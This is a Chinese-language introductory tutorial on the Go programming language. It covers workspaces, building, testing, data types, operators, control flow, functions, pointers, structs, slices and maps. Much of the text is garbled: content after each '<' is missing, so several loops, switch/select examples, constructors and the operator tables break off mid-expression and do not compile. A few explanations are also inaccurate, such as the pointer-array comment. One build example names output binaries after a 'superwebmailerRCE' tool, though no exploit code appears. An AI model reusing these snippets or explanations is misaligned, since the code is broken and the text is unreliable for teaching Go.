Pike, 和 Ken Thompson在谷歌于2007年开发出来的编程语言。Go编程语言是静态类型语言，语法类似于C语言，它提供了垃圾收集，类型安全，动态的输入能力，还有很多先进的内置类型，例如，可变长度数组和映射（键-值对）。它还提供了丰富的标准库。 Go编程语言是在2009年11月正式对外发布，主要是应用谷歌的于一些生产系统链中。 Hello World package main import \"fmt\" func main() { fmt.Println(\"HELLO WORLD\") } go run Hello.go GO语言基础 工作空间 go工具为公共代码仓库中维护的开源代码而设计。 无论会不会公布代码，该模型设置工作环境的方法都是相同的。 Go代码必须放在工作空间内。它其实就是一个目录，其中包含三个子目录： src 目录包含Go的源文件，它们被组织成包（每个目录都对应一个包） pkg 目录包含包对象 bin 目录包含可执行命令 go 工具用于构建src目录中的源码包，并将其生成的二进制文件安装到 pkg 和 bin 目录中。 src 子目录通常包会含多种版本控制的代码仓库（例如Git或Mercurial）， 以此来跟踪一个或多个源码包的开发。 结构举例如下： bin/ hello # 可执行命令 pkg/ linux_amd64/ # 这里会反映出你的操作系统和架构 github.com/user/ stringutil.a # 包对象 src/ github.com/user/ hello/ hello.go # 命令源码 stringutil/ reverse.go # 包源码 环境变量 go env 而 GOPATH 环境变量指定了你的工作空间位置，这也是很重要的一个变量。 首先创建一个工作空间目录，并设置相应的 GOPATH，工作空间可以放在任何地方，我们使用 $HOME/go。 注意，它绝对不能和你的Go安装目录相同。（另一种常见的设置是 GOPATH=$HOME。） 设置GOPATH export GOPATH=$HOME/go 然后将bin添加到环境变量中 export PATH=$PATH:$GOPATH/bin 包路径 标准库中的包有给定的短路径，比如 \"fmt\" 和 \"net/http\"。 对于你自己的包，你必须选择一个基本路径，来保证它不会与将来添加到标准库， 或其它扩展库中的包相冲突。 如果你将你的代码放到了某处的源码库，那就应当使用该源码库的根目录作为你的基本路径。 例如，若你在 GitHub 上有账户 github.com/user 那么它就应该是你的基本路径。 我们将使用 github.com/user 作为基本路径。在你的工作空间里创建一个目录， 我们将源码存放到其中： mkdir -p $GOPATH/src/github.com/user 包名 源文件中的第一个语句必须是 package 名称 这里的 **名称** 即为导入该包时使用的默认名称。 （一个包中的所有文件都必须使用相同的 **名称**。） Go的约定是包名为导入路径的最后一个元素：作为 “crypto/rot13” 导入的包应命名为 rot13。 可执行命令必须使用 package main。 链接成单个二进制文件的所有包，其包名无需是唯一的，只有导入路径（它们的完整文件名） 才是唯一的。 包文档 1、使用命令go doc go doc fmt.Println 2、另一种比较常用的方式，是直接进去包内查看源码 代码结构 Go 语言的基础组成有以下几个部分： 包声明 引入包 函数 变量 语句 & 表达式 注释 以上面的hello world代码为例 package main // 定义了包名。必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 import \"fmt\" // 引用fmt包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数 func main() { // 程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数） fmt.Println(\"HELLO WORLD\") // 调用fmt包中的函数，将字符串输出到控制台，并在最后自动增加换行字符 \\n } 其他： //开头的为单行注释，/*开头，并以*/结尾为多行注释 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） 函数名首字母小写即为 protected :func getId() {} 函数名首字母大写即为 public : func Printf() {} 代码编译运行 创建目录/Users/d4m1ts/go/src/github.com/damit5/goTest，并编写代码Hello.go，代码如上 快速运行 编写完成代码后，有两种方法可以快速运行 一种是直接动态运行 go run xxx.go 另一种则是先编译成二进制文件再手动执行 go build xxx.go 安装到本地 还有一种方法可以安装到本地，简单来说就是生成二进制文件并且放到bin目录下，如果在项目目录中就直接go install即可，在其他路径则需要带上src后的路径 go install go install github.com/damit5/goTest 无论是安装包还是二进制文件，go 工具都会安装它所依赖的任何东西 如果提示go: go.mod file not found in current directory or any parent directory; see 'go help modules'，说明需要初始化项目，执行 go mod init {项目名} 然后就可以用go install了，生成后的二进制文件自动存放在bin目录中 远程下载并编译 前提是提前上传到github中 若指定的包不在工作空间中，go get就会将会将它放到 GOPATH 指定的第一个工作空间内。（若该包已存在，go get 就会跳过远程获取， 其行为与 go install 相同） go get github.com/damit5/goTest go get -v github.com/damit5/goTest 交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 代码测试 Go拥有一个轻量级的测试框架，它由 go test 命令和 testing 包构成。 你可以通过创建一个名字以 _test.go 结尾的，包含名为 TestXXX 且签名为 func (t *testing.T) 函数的文件来编写测试。 测试框架会运行每一个这样的函数；若该函数调用了像 t.Error 或 t.Fail 这样表示失败的函数，此测试即表示失败。 实例： package main import ( \"fmt\" \"testing\" ) func sum(a int, b int) int { return a+b } func TestSum(t *testing.T) { a := 10 b := 20 c := sum(a, b) if c == a+b { fmt.Println(\"success\") } else { t.Errorf(\"error happends\") } } 代码编写后，使用如下命令即可测试 go test go test github.com/damit5/goTest GO标记 Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成： fmt.Println(\"Hello, World!\") 6 个标记是(每行一个)： fmt . Println ( \"Hello, World!\" ) 标识符 标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母( A ~ Z 和 a ~ z)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 关键字 下面列举了 Go 代码中会使用到的 25 个关键字或保留字： break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var 除了以上介绍的这些关键字，Go 语言还有 36 个预定义标识符： append bool byte cap close complex complex64 complex128 uint16 copy false float32 float64 imag int int8 int16 uint32 int32 int64 iota len make new nil panic uint64 print println real recover string true uint uint8 uintptr 行分隔符; 在Go程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。 如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。 注释 注释不会被编译，每一个包应该有相关注释。 // 单行注释 /* 多行注释 */ 字符串连接 和大多数语言一样，连接通过+来实现 fmt.Println(\"HELLO WORLD\\t\" + \"d4m1ts\") 格式化字符串 Go 语言中使用 fmt.Sprintf 格式化字符串并赋值给新串 package main import \"fmt\" func main() { var keyword = \"world\" var name = \"d4m1ts\" var age = 18 var template = \"hello %s %s %d\" var sentence = fmt.Sprintf(template, keyword, name, age) fmt.Println(sentence) } // hello world d4m1ts 18 数据类型 序号 类型和描述 1 布尔型布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true 。 | | 2 | 数字类型整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 | | 3 | 字符串类型:字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 | | 4 | 派生类型:包括： (a) 指针类型（Pointer） (b) 数组类型 (c) 结构化类型(struct) (d) Channel 类型 (e) 函数类型 (f) 切片类型 (g) 接口类型（interface） (h) Map 类型 | 数字类型 Go 也有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号 8 位整型 (0 到 255) 2 uint16 无符号 16 位整型 (0 到 65535) 3 uint32 无符号 32 位整型 (0 到 4294967295) 4 uint64 无符号 64 位整型 (0 到 18446744073709551615) 5 int8 有符号 8 位整型 (-128 到 127) 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型 序号 类型和描述 1 float32 IEEE-754 32位浮点型数 2 float64 IEEE-754 64位浮点型数 3 complex64 32 位实数和虚数 4 complex128 64 位实数和虚数 其他数字类型 以下列出了其他更多的数字类型： 序号 类型和描述 1 byte 类似 uint8 2 rune 类似 int32 3 uint 32 或 64 位 4 int 与 uint 一样大小 5 uintptr 无符号整型，用于存放一个指针 值类型和引用类型 值类型是单独记录在内存中的，每2个数据都是独立的，其中一个修改不会影响到另一个 引用类型记录的是指针地址，如果2个数据指向同一个地址，那么其中一个被修改了，另一个也会被修改 所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值 当使用等号 = 将一个变量的值赋值给另一个变量时，如：j = i，实际上是在内存中将 i 的值进行了拷贝，可以通过 &i 来获取变量 i 的内存地址 而更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。 一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置 这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。 同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。 当使用赋值语句 r2 = r1 时，只有引用（地址）被复制。 如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。 GO开发基础 声明变量 变量名由字母、数字、下划线组成，其中首个字符不能为数字。 声明变量的一般形式是使用 var 关键字： 语法： // 标准语法 var identifier type // 也可以同时声明多个变量 var identifier1, identifier2 type // 1. 指定变量类型，如果没有初始化，则变量默认为零值（没有做初始化时系统默认设置的值） var a int // 0 var b bool // false var c string // \"\" var a []int // nil // 2. 没有指定变量类型，则根据值自行判定变量类型 var d = true // 自动识别为bool // 3. 使用 := 可以快速声明变量 /* := 等价于 var name string; name = \"d4m1ts\" 这种格式只能在函数体中出现 */ name := \"d4m1ts\" // 4. 如果变量已经使用 var 声明过了，再使用 := 声明变量，就产生编译错误 var name = \"d4m1ts\" name := \"d4m1ts\" 单变量声明实例： var a,b int8 a = 1 b = 2 var name = \"d4m1ts\" name1 := \"d4m1ts\" 多变量声明实例： var a,b int = 1,2 c,d := 3,4 任意变量： 如果想接受任意类型的变量，可以用interface 比如var jsonData []map[string]interface{} package main import ( \"fmt\" ) func init() { fmt.Print(\"init\") } func main() { test1(\"123\") test1(1) test2(\"123\",1, \"324\", 12) } // 实现传单个任何类型的参数 func test1(v interface{}) { fmt.Println(v) // 打印 “123” 1 } // 实现传任意多个任意类型的参数 func test2(v ...interface{}) { for _, m := range v { fmt.Println(m) // 依次打印 123 1 324 12 } } interface{}转string var a interface{} a.(string) 声明常量 常量是一个简单值的标识符，在程序运行时，不会被修改的量，一般形式是使用 const 关键字。 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。 语法： 和变量一样，type可以省略 显式类型定义： const b string = \"abc\" 隐式类型定义： const b = \"abc\"const identifier [type] = value 定义实例：const j = 4 const i,j = 3,4 用作枚举：package main import ( \"fmt\" \"unsafe\" ) func main() { const ( a = \"abc\" b = len(a) c = unsafe.Sizeof(b) ) fmt.Println(c) } // 8 iota： 特殊常量，可以认为是一个可以被编译器修改的常量 iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。package main import \"fmt\" func main() { const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) fmt.Println(a,b,c,d,e,f,g,h,i) } // 0 1 2 ha ha 100 100 7 8 运算符 算术运算符 下表列出了所有Go语言的算术运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 + 相加 A + B 输出结果 30 - 相减 A - B 输出结果 -10 * 相乘 A * B 输出结果 200 / 相除 B / A 输出结果 2 % 求余 B % A 输出结果 0 ++ 自增 A++ 输出结果 11 -- 自减 A-- 输出结果 9 关系运算符 下表列出了所有Go语言的关系运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 == 检查两个值是否相等，如果相等返回 True 否则返回 False。 (A == B) 为 False != 检查两个值是否不相等，如果不相等返回 True 否则返回 False。 (A != B) 为 True > 检查左边值是否大于右边值，如果是返回 True 否则返回 False。 (A > B) 为 False 检查左边值是否小于右边值，如果是返回 True 否则返回 False。 (A >= 检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。 (A >= B) 为 False 检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。 (A 逻辑运算符 下表列出了所有Go语言的逻辑运算符。假定 A 值为 True，B 值为 False。 运算符 描述 实例 && 逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。 (A && B) 为 False || 逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。 (A || B) 为 True ! 逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。 !(A && B) 为 True 位运算符 位运算符对整数在内存中的二进制位进行操作。 下表列出了位运算符 &, |, 和 ^ 的计算： p q p & q p | q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 Go 语言支持的位运算符如下表所示。假定 A 为60，B 为13： 运算符 描述 实例 & 按位与运算符\"&\"是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 (A & B) 结果为 12, 二进制为 0000 1100 | 按位或运算符\"|\"是双目运算符。 其功能是参与运算的两数各对应的二进位相或 (A | B) 结果为 61, 二进制为 0011 1101 ^ 按位异或运算符\"^\"是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 (A ^ B) 结果为 49, 二进制为 0011 0001 左移运算符\" A >> 右移运算符\">>\"是双目运算符。右移n位就是除以2的n次方。 其功能是把\">>\"左边的运算数的各二进位全部右移若干位，\">>\"右边的数指定移动的位数。 A >> 2 结果为 15 ，二进制为 0000 1111 赋值运算符 下表列出了所有Go语言的赋值运算符。 运算符 描述 实例 = 简单的赋值运算符，将一个表达式的值赋给一个左值 C = A + B 将 A + B 表达式结果赋值给 C += 相加后再赋值 C += A 等于 C = C + A -= 相减后再赋值 C -= A 等于 C = C - A *= 相乘后再赋值 C = A 等于 C = C A /= 相除后再赋值 C /= A 等于 C = C / A %= 求余后再赋值 C %= A 等于 C = C % A 左移后赋值 C >>= 右移后赋值 C >>= 2 等于 C = C >> 2 &= 按位与后赋值 C &= 2 等于 C = C & 2 ^= 按位异或后赋值 C ^= 2 等于 C = C ^ 2 |= 按位或后赋值 C |= 2 等于 C = C | 2 其他运算符 下表列出了Go语言的其他运算符。 运算符 描述 实例 & 返回变量存储地址 &a; 将给出变量的实际地址。 * 指针变量。 *a; 是一个指针变量 运算符优先级 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 优先级 运算符 5 * / % > & &^ 4 + - | ^ 3 == != >= 2 && 1 || 空白标识符 用 _ 可以代表被丢弃的值，避免一些变量因为没使用导致程序报错 实例： 变量j必须使用，否则会报错 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for j,i := range a { fmt.Println(j, i) } } 使用_来丢弃上面的j变量 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for _,i := range a { fmt.Println(i) } } 格式化输出 Go采用的格式化打印风格和C的 printf 族类似，但却更加丰富而通用。 这些函数位于 fmt 包中，且函数名首字母均为大写：如 fmt.Printf、fmt.Fprintf，fmt.Sprintf 等。 字符串函数（Sprintf 等）会返回一个字符串，而非填充给定的缓冲区。 常见格式 var t interface{} t = functionOfSomeType() switch t := t.(type) { default: fmt.Printf(\"unexpected type %T\", t) // %T 输出 t 是什么类型 case bool: fmt.Printf(\"boolean %t\\n\", t) // t 是 bool 类型 case int: fmt.Printf(\"integer %d\\n\", t) // t 是 int 类型 case *bool: fmt.Printf(\"pointer to boolean %t\\n\", *t) // t 是 *bool 类型 case *int: fmt.Printf(\"pointer to integer %d\\n\", *t) // t 是 *int 类型 } 通用格式 package main import ( \"fmt\" ) type structTest struct { name string age int } func main() { a := structTest{ name: \"d4m1ts\", age: 18, } fmt.Printf(\"123 %v 456\\n\", \"aa\") // 123 aa 456 fmt.Printf(\"123 %v 456\\n\", a) // 123 {d4m1ts 18} 456 fmt.Printf(\"123 %+v 456\\n\", a) // 123 {name:d4m1ts age:18} 456 fmt.Printf(\"123 %#v 456\\n\", a) // 123 main.structTest{name:\"d4m1ts\", age:18} 456 } // 通用的格式 %v（对应“值”），这种格式还能打印任意值，甚至包括数组、结构体和映射。 // 当打印结构体时，改进的格式 %+v 会为结构体的每个字段添上字段名，而另一种格式 %#v 将完全按照Go的语法打印值。 条件语句 注意大括号{的位置，不能单独一行！！！ if package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 5){ fmt.Println(name) } } if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else { fmt.Println(\"NONONO\") } } if...else if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else if (len(name) == 6) { fmt.Println(name, \"==6\") } else { fmt.Println(\"NONONO\") } } switch package main import \"fmt\" func main() { name := \"d4m1ts\" switch { case len(name) > 5: fmt.Print(\">5\") case len(name) select select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。 select 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。 语法: Go 编程语言中 select 语句的语法如下： select { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s); } 以下描述了 select 语句的语法： 每个 case 都必须是一个通信 所有 channel 表达式都会被求值 所有被发送的表达式都会被求值 如果任意某个通信可以进行，它就执行，其他被忽略。 如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。否则： 如果有 default 子句，则执行该语句。 如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。 实例： package main import \"fmt\" func main() { var c1, c2, c3 chan int var i1, i2 int select { case i1 = 循环语句 for 语法： 共有3种语法，分别是 // 1.和 C 语言的 for 一样 for init; condition; post { } // 2.和 C 的 while 一样 for condition { } // 3.while true，需要手动break for { } init： 一般为赋值表达式，给控制变量赋初值； condition： 关系表达式或逻辑表达式，循环控制条件； post： 一般为赋值表达式，给控制变量增量或减量。 实例： package main import \"fmt\" func main() { sum := 0 // 1 ==> 10 for i:=0; i 40 for sum 160 for { sum += sum if sum > 100{ break } } fmt.Println(sum) } for each 严格来说是 for each range 循环 package main import \"fmt\" func main() { ab := []string {\"aaa\", \"bbb\"} for i,s := range ab{ fmt.Println(i ,s) } } /* 0 aaa 1 bbb */ 无限循环 package main import \"fmt\" func main() { for true { fmt.Println(\"1\") } } 循环控制 就是让循环停止或者跳过此次循环 break 经常用于中断当前 for 循环或跳出 switch 语句 continue 跳过当前循环的剩余语句，然后继续进行下一轮循环。 goto 将控制转移到被标记的语句。 goto见比较少，举个例子吧 package main import \"fmt\" func main() { a := 10 LOOP: for a init函数 每个源文件都可以通过定义自己的无参数 init 函数来设置一些必要的状态。（其实每个文件都可以拥有多个 init 函数。）而它的结束就意味着初始化结束：只有该包中的所有变量声明都通过它们的初始化器求值后 init 才会被调用， 而那些init 只有在所有已导入的包都被初始化后才会被求值。 除了那些不能被表示成声明的初始化外，init 函数还常被用在程序真正开始执行前，检验或校正程序的状态。 package main import \"fmt\" func init() { fmt.Println(\"init ...\") } func main() { fmt.Println(\"main ...\") } /* init ... main ... */ 自定义函数 语法： func function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析： func：函数由 func 开始声明 function_name：函数名称，参数列表和返回值类型构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。 实例： 选出2个数中最大的 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) int { if a > b { return a } else { return b } } 返回多个值 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) (int,int) { if a > b { return a,b } else { return b,a } } 引用传递值 传入的是地址，函数内值被修改，函数外也会受影响 package main import \"fmt\" func main() { a := 66 test(&a) fmt.Println(a) } func test(a *int) { fmt.Println(*a) *a += 10 fmt.Println(*a) } /* 66 76 76 */ 构造函数与复合字面 有时零值还不够好，这时就需要一个初始化构造函数，如来自 os 包中的这段代码所示。 func NewFile(fd int, name string) *File { if fd 这里显得代码过于冗长。我们可通过复合字面来简化它， 该表达式在每次求值时都会创建新的实例 func NewFile(fd int, name string) *File { if fd 作用域 局部变量 在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 全局变量 在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用； 全局变量可以在任何函数中使用 全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑 实例： package main import \"fmt\" var global string = \"全局变量\" func main() { fmt.Println(global) } 数组 初始化数组 如果数组长度不确定，可以使用 ... 代替数组的长度，编译器会根据元素个数自行推断数组的长度（也可以使用切片） 初始化数组中 {} 中的元素个数不能大于 [] 中的数字 语法： var variable_name [SIZE] variable_type var balance [10] float32 实例： package main import \"fmt\" func main() { var a [10] string var b = [...] int {1,2,3,4,5} c := [] string {\"aa\", \"bb\", \"cc\"} // 切片 fmt.Println(a) fmt.Println(b) fmt.Println(c) } 访问数组 数组元素可以通过索引（位置）来读取。格式为数组名后加中括号，中括号中为索引的值。 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} fmt.Println(c[0]) for i,s := range c { fmt.Println(i, s) } } 指针 使用指针 会C的指针，这个就很简单了 取地址符是&，放到一个变量前使用就会返回相应变量的内存地址 取值符是*，放到一个内存地址前使用就会返回相应变量的值 package main import \"fmt\" func main() { a := 1 // 实际变量 var ip *int // 指针变量 ip = &a fmt.Println(\"a的值：\", a) fmt.Println(\"a的地址：\", &a) fmt.Printf(\"a的地址：%x\", ip) } 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr package main import \"fmt\" func main() { var ptr *int // 指针变量 fmt.Printf(\"ptr空指针地址：%x\", ptr) } // 0 判断空指针 if(ptr != nil) /* ptr 不是空指针 */ if(ptr == nil) /* ptr 是空指针 */ 指针数组 有一种情况，我们可能需要保存数组，这样我们就需要使用到指针 package main import \"fmt\" func main() { var a = [] int {1,2,3} var ptr [3] *int for i,s := range a { ptr[i] = &s } fmt.Println(ptr) // [0xc000198000 0xc000198000 0xc000198000] for i,s := range ptr { fmt.Println(i, *s) } } ptr 为整型指针数组，因此每个元素都指向了数组中第一个值的地址 结构体 定义结构体 结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下： type struct_variable_type struct { member definition member definition ... member definition } 一旦定义了结构体类型，它就能用于变量的声明，语法格式如下： variable_name := structure_variable_type {value1, value2...valuen} // 或 variable_name := structure_variable_type { key1: value1, key2: value2..., keyn: valuen} 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{\"d4m1\", 18} fmt.Println(a) b := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(b) } /* {d4m1 18} {d4m1ts 18} */ 访问成员 如果要访问结构体成员，需要使用点号.操作符，格式为： 结构体.成员名 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(a.name) } // d4m1ts 结构体作为参数 和其他类型一样，只不过类型是结构体罢了 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} printName(a) } func printName(stru testStruct) { fmt.Println(stru.name) } 结构体指针 也和其他指针一样 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(&a) printName(&a) } func printName(stru *testStruct) { fmt.Println(stru.name) } /* &{d4m1ts 18} d4m1ts */ 切片 Go 语言切片是对数组的抽象。 Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(\"动态数组\")，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。 定义切片 可以声明一个未指定大小的数组来定义切片，切片不需要说明长度 var identifier []type 或使用 make() 函数来创建切片: var slice1 []type = make([]type, len) // 也可以简写为 slice1 := make([]type, len) 也可以指定容量，其中 capacity 为可选参数。 make([]T, length, capacity) 这里 len 是数组的长度并且也是切片的初始长度。 实例： package main import \"fmt\" func main() { var slice1 []int fmt.Println(slice1) // [] var slice2 []int = make([]int, 10) fmt.Println(slice2) // [0 0 0 0 0 0 0 0 0 0] } 初始化切片 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(s1) // [1 2 3 4 5] // 使用数组来初始化切片 d1 := [10]int {1,3,5,7,9} fmt.Println(d1) // [1 3 5 7 9 0 0 0 0 0] s2 := d1[:] fmt.Println(s2) // [1 3 5 7 9 0 0 0 0 0] s3 := d1[2:] fmt.Println(s3) // [5 7 9 0 0 0 0 0] } 空(nil)切片 一个切片在未初始化之前默认为 nil，长度为 0 package main import \"fmt\" func main() { var s1 []int fmt.Println(s1) // [] fmt.Println(s1 == nil) // true } 切片截取 和python一样，array[start:end]截取即可 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} fmt.Println(s1[2:4]) // [3 4] } len()和cap()函数 切片是可索引的，并且可以由len()方法获取长度。 切片提供了计算容量的方法cap()可以测量切片最长可以达到多少。 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(len(s1)) // 5 fmt.Println(cap(s1)) // 5 } 追加元素 通过append函数可以追加元素 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") fmt.Println(c) // [aa bb cc dd ee] } 如果想合并2个切片，也可以使用append 注意的是要添加...，如果没有 ...，它就会由于类型错误而无法编译 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") x := [] string {\"1\",\"2\",\"3\"} c = append(c, x...) fmt.Println(c) // [aa bb cc dd ee 1 2 3] } append()和copy()函数 如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。 下面的代码描述了从拷贝切片的 copy 方法和向切片追加新元素的 append 方法。 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} s1 = append(s1, 666) // [1 2 3 4 5 666] s1 = append(s1, 7,8,9) // [1 2 3 4 5 666 7 8 9] fmt.Println(s1) s2 := make([]int, len(s1)*2, cap(s1)*2) copy(s2, s1) // 把s1的内容复制给s2 fmt.Println(s2) // [1 2 3 4 5 666 7 8 9 0 0 0 0 0 0 0 0 0] } 集合(Map) Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。 Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。 定义Map 可以使用内建函数 make 也可以使用 map 关键字来定义 Map: /* 声明变量，默认 map 是 nil */ var map_variable map[key_data_type]value_data_type /* 使用 make 函数 */ map_variable := make(map[key_data_type]value_data_type) 实例： package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" fmt.Println(m1) // 2.使用make创建 m2 := make(map[string]string) m2 [\"e\"] = \"f\" fmt.Println(m2) } 删除元素 delete()函数用于删除集合的元素, 参数为map和其对应的key package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" delete(m1, \"a\") fmt.Println(m1) // map[b:test2 c:test3] } 范围(Range) range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对 package main import \"fmt\" func main() { // 遍历切片 var s1 = []int {1,2,3,4,5} sum := 0 for _,num := range s1 { // _空白符，表示被舍弃的变量，这里的变量是索引 sum += num } fmt.Println(sum) // 遍历map m1 := map[string]string{ \"a\":\"test1\", \"b\":\"test2\", } for k,v := range m1 { fmt.Println(k, v) } } 类型转换 类型转换用于将一种数据类型的变量转换为另外一种类型的变量 语法： type_name为类型，expression为表达式 type_name(expression) 实例： package main import \"fmt\" func main() { a := 1 fmt.Println(string(a)) // 空 fmt.Println(float32(a)) // 1 } 递归 递归，就是在运行的过程中调用自己 阶乘实例 package main import \"fmt\" func Factorial(n uint64)(result uint64) { if (n > 0) { result = n * Factorial(n-1) return result } return 1 } func main() { var i int = 15 fmt.Printf(\"%d 的阶乘是 %d\\n\", i, Factorial(uint64(i))) } // 15 的阶乘是 1307674368000 斐波那契数列实例 package main import \"fmt\" func fibonacci(n int) int { if n 接口 